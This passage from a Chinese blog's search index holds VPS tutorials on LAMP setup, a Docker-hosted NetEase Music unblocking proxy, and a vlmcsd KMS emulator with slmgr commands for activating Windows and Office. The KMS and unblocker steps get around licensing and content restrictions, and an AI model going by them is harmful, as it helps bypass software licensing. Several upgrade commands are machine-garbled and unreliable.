例：123.123.123.123:8080</p><p>可以B站看视频进行相关配置，<a href="https://www.bilibili.com/video/BV19J411R7xa?from=search&seid=12146123682062738925">B站视频地址</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> vps </tag>
            
            <tag> NPS </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP框架搭建</title>
      <link href="2020/03/23/LAMP/"/>
      <url>2020/03/23/LAMP/</url>
      
        <content type="html"><![CDATA[<h2 id="LAMP的搭建"><a href="#LAMP的搭建" class="headerlink" title="LAMP的搭建"></a>LAMP的搭建</h2><ul><li>如果您的服务器系统：Amazon Linux / CentOS / RedHat</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;teddysun&#x2F;lamp.git</span><br><span class="line">cd lamp</span><br><span class="line">chmod 755 *.sh</span><br><span class="line">.&#x2F;lamp.sh</span><br></pre></td></tr></table></figure><ul><li>如果您的服务器系统：Debian / Ubuntu</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install wget git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;teddysun&#x2F;lamp.git</span><br><span class="line">cd lamp</span><br><span class="line">chmod 755 *.sh</span><br><span class="line">.&#x2F;lamp.sh</span><br></pre></td></tr></table></figure><ul><li><a href="https://lamp.sh/autoinstall.html">自动化安装模式</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;lamp.sh -h</span><br></pre></td></tr></table></figure><ul><li>自动化安装模式示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;lamp.sh --apache_option 1 --apache_modules mod_wsgi,mod_security --db_option 2 --db_root_pwd teddysun.com --php_option 5 --php_extensions apcu,ioncube,imagick,redis,mongodb,libsodium,swoole --db_manage_modules phpmyadmin,adminer --kodexplorer_option 1</span><br></pre></td></tr></table></figure><h2 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CD  〜 &#x2F;灯</span><br><span class="line">git reset --hard &#x2F;&#x2F;重置索引和工作树</span><br><span class="line">git pull &#x2F;&#x2F;首先获取最新版本</span><br><span class="line">chmod 755 * .sh</span><br><span class="line"></span><br><span class="line">.&#x2F;upgrade.sh &#x2F;&#x2F;选择一个进行升级</span><br><span class="line">.&#x2F;upgrade.sh apache &#x2F;&#x2F;升级Apache</span><br><span class="line">.&#x2F;upgrade.sh db &#x2F;&#x2F;升级MySQL或MariaDB</span><br><span class="line">.&#x2F;upgrade.sh php &#x2F;&#x2F;升级PHP</span><br><span class="line">.&#x2F;upgrade.sh phpmyadmin &#x2F;&#x2F;升级phpMyAdmin</span><br><span class="line">.&#x2F;upgrade.sh管理员&#x2F;&#x2F;升级管理员</span><br></pre></td></tr></table></figure><h2 id="后备"><a href="#后备" class="headerlink" title="后备"></a>后备</h2><ul><li>您必须先修改配置，然后再运行</li><li>备份MySQL或MariaDB日期数据库，文件和目录</li><li>备份文件使用SHA1消息摘要通过AES256-cbc加密（取决于<code>openssl</code>命令）（选项）</li><li>自动将备份文件传输到Google云端硬盘（取决于<a href="https://teddysun.com/469.html"><code>rclone</code></a>命令）（可选）</li><li>自动将备份文件传输到FTP服务器（取决于<code>ftp</code>命令）（可选）</li><li>自动从Google云端硬盘或FTP服务器删除远程文件（可选）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;backup.sh</span><br></pre></td></tr></table></figure><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;uninstall.sh</span><br></pre></td></tr></table></figure><p><a href="https://lamp.sh/autoinstall.html">文章参考</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> vps </tag>
            
            <tag> LAMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易云代理音乐服务器搭建</title>
      <link href="2020/03/23/%E7%BD%91%E6%98%93%E4%BA%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E9%94%81%E4%B8%8B%E6%9E%B6%E6%AD%8C%E6%9B%B2/"/>
      <url>2020/03/23/%E7%BD%91%E6%98%93%E4%BA%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E9%94%81%E4%B8%8B%E6%9E%B6%E6%AD%8C%E6%9B%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="网易云代理服务器搭建"><a href="#网易云代理服务器搭建" class="headerlink" title="网易云代理服务器搭建"></a>网易云代理服务器搭建</h1><h2 id="搭建Docker容器"><a href="#搭建Docker容器" class="headerlink" title="搭建Docker容器"></a>搭建Docker容器</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h3><p><a href="https://www.docker.com/">Docker</a>是一个简化<em>容器中</em>应用程序进程管理过程的应用程序。容器允许您在资源隔离的进程中运行应用程序。它们与虚拟机类似，但容器更便携，更加资源友好，并且更依赖于主机操作系统。</p><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>官方Debian存储库中提供的Docker安装包可能不是最新版本。为了确保我们获得最新版本，我们将从官方Docker存储库安装Docker。为此，我们将添加一个新的包源，从Docker添加GPG密钥以确保下载有效，然后安装该包。</p><p>首先，更新现有的包列表：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>接下来，安装一些允许<code>apt</code>使用包通过HTTPS的必备软件包：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apt-transport-https ca-certificates curl gnupg2 software-properties-common</span><br></pre></td></tr></table></figure><p>然后将官方Docker存储库的GPG密钥添加到您的系统：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:<span class="comment">//download.docker.com/linux/debian/gpg | sudo apt-key add -</span></span><br></pre></td></tr></table></figure><p>将Docker存储库添加到APT源：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable&quot;</span></span><br></pre></td></tr></table></figure><p>接下来，使用新添加的repo中的Docker包更新包数据库：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>确保您要从Docker repo而不是默认的Debian repo安装：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache policy docker-ce</span><br></pre></td></tr></table></figure><p>虽然Docker的版本号可能不同，但您会看到这样的输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker-ce:</span><br><span class="line">  Installed: (none)</span><br><span class="line">  Candidate: <span class="number">18.06</span><span class="number">.1</span>~ce~<span class="number">3</span>-<span class="number">0</span>~debian</span><br><span class="line">  Version table:</span><br><span class="line">     <span class="number">18.06</span><span class="number">.1</span>~ce~<span class="number">3</span>-<span class="number">0</span>~debian <span class="number">500</span></span><br><span class="line">        <span class="number">500</span> https:<span class="comment">//download.docker.com/linux/debian stretch/stable amd64 Packages</span></span><br></pre></td></tr></table></figure><p>请注意，<code>docker-ce</code>未安装，但安装的候选者来自Debian 9（<code>stretch</code>）的Docker存储库。</p><p>最后，安装Docker：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-ce</span><br></pre></td></tr></table></figure><p>现在应该安装Docker，守护进程启动，并启用进程启动进程。检查它是否正在运行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure><p>输出应类似于以下内容，表明该服务处于活动状态并正在运行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">● docker.service - Docker Application Container Engine</span><br><span class="line">   Loaded: loaded (<span class="regexp">/lib/</span>systemd/system/docker.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since Thu <span class="number">2018</span>-<span class="number">07</span>-<span class="number">05</span> <span class="number">15</span>:<span class="number">08</span>:<span class="number">39</span> UTC; 2min 55s ago</span><br><span class="line">     Docs: https:<span class="comment">//docs.docker.com</span></span><br><span class="line">  Main PID: <span class="number">21319</span> (dockerd)</span><br><span class="line">   CGroup: <span class="regexp">/system.slice/</span>docker.service</span><br><span class="line">           ├─<span class="number">21319</span> /usr/bin/dockerd -H fd:<span class="comment">//</span></span><br><span class="line">           └─<span class="number">21326</span> docker-containerd --config /<span class="keyword">var</span>/run/docker/containerd/containerd.toml</span><br></pre></td></tr></table></figure><p>现在安装Docker不仅可以为您提供Docker服务（守护程序），还可以为您提供<code>docker</code>命令行实用程序或Docker客户端。我们将在本教程后面探讨如何使用该<code>docker</code>命令。</p><p>其他详细的管理可以查看具体的文章：<a href="https://cloud.tencent.com/developer/article/1360720">debian9搭建Docker</a></p><h2 id="网易云代理"><a href="#网易云代理" class="headerlink" title="网易云代理"></a>网易云代理</h2><p>GitHub项目地址：<a href="https://github.com/nondanee/UnblockNeteaseMusic">UnblockNeteaseMusic</a></p><p>可以使用本地代理，也可以云服务器代理，部署有两种方式，一种npx一种 docker，现在使用较为简单的docker部署。</p><h3 id="Docker部署"><a href="#Docker部署" class="headerlink" title="Docker部署"></a>Docker部署</h3><p>拉取镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nondanee&#x2F;unblockneteasemusic</span><br></pre></td></tr></table></figure><p>运行容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart&#x3D;always --name yunmusic -d -p 8999:8080 nondanee&#x2F;unblockneteasemusic</span><br></pre></td></tr></table></figure><p><strong>记得在服务器商开放端口</strong></p><p>解释一下参数<br><strong>重启动打开 –restart=always<br>容器名字是 –name yunmusic<br>后台运行 -d<br>映射端口 本地的8999是容器的8080<br>最后是镜像名</strong></p><p>成功图：</p><p><strong><img src="https://images.cnblogs.com/cnblogs_com/duskry/1655101/o_200225231128Snipaste_2020-02-25_14-25-18.png" alt="图片"></strong></p><p><strong>注意：</strong>这样的设置我们相当与就是一个代理服务器 ，所有的流量通过这个端口都要转发给服务器，所以 可能有人滥用毕竟没有密码。</p><h3 id="GitHub上强调"><a href="#GitHub上强调" class="headerlink" title="GitHub上强调"></a><strong>GitHub上强调</strong></h3><p><strong>若将服务部署到公网，强烈建议使用严格模式 (此模式下仅放行网易云音乐所属域名的请求) -s 限制代理范围 (需使用 PAC 或 hosts)，或启用 Proxy Authentication -t : 设置代理用户名密码 (目前密码认证在 Windows 客户端设置和 macOS 系统设置都无法生效，请不要使用)，以防代理被他人滥用</strong><br><strong>安全考虑可以考虑加上-s的选项 这样就是ip：port xxxx.pac</strong></p><p>在运行docker容器时可以加如下参数来保证每次docker服务重启后容器也自动重启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart&#x3D;always</span><br></pre></td></tr></table></figure><p>如果已经启动了则可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker update --restart&#x3D;always &lt;CONTAINER ID&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> docker </tag>
            
            <tag> vps </tag>
            
            <tag> 网易云音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMS 服务</title>
      <link href="2020/03/12/KMS%20%E6%9C%8D%E5%8A%A1/"/>
      <url>2020/03/12/KMS%20%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="KMS-服务"><a href="#KMS-服务" class="headerlink" title="KMS 服务"></a>KMS 服务</h1><p>用来激活 VOL 版本的 Windows 和 Office</p><blockquote><p>系统支持：CentOS 6+，Debian 7+，Ubuntu 12+<br>虚拟技术：任意<br>内存要求：≥128M</p></blockquote><h2 id="服务器端配置"><a href="#服务器端配置" class="headerlink" title="服务器端配置**"></a>服务器端配置**</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;Wind4&#x2F;vlmcsd&#x2F;releases&#x2F;download&#x2F;svn1112&#x2F;binaries.tar.gz</span><br><span class="line"></span><br><span class="line">tar zxvf binaries.tar.gz</span><br><span class="line"></span><br><span class="line">cd binaries&#x2F;Linux&#x2F;intel&#x2F;static</span><br><span class="line"></span><br><span class="line">.&#x2F;vlmcsd-x64-musl-static</span><br><span class="line"></span><br><span class="line">ps -ef | grep vlmcsd-x64-musl-static</span><br></pre></td></tr></table></figure><h2 id="客户端激活"><a href="#客户端激活" class="headerlink" title="客户端激活"></a>客户端激活</h2><blockquote><p>cd /d “%SystemRoot%\system32”<br>slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX<br>slmgr /skms 149.28.52.34   #更改服务器IP地址<br>slmgr /ato<br>slmgr /xpr</p></blockquote><p><a href="https://teddysun.com/530.html">参考文章</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> vps </tag>
            
            <tag> KMS </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
